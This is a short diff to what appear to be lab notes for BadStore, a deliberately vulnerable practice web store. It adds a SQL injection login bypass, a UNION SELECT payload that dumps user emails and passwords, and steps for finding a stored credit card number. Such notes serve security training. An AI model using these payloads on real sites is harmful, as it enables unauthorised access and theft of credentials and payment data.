@@ -7,4 +7,9 @@
 - nmap 192.168.1.0/24 (subnet)
 
 9c)
-- 
+- http://<ip>/cgi-bin/badstore.cgi?action=login
+- joe@supplier.com' --
+- ALITER
+- In search bar : x' UNION SELECT null, email, passwd, null FROM userdb WHERE email='joe@supplier.com' --
+- Go to order history
+- Find cc number
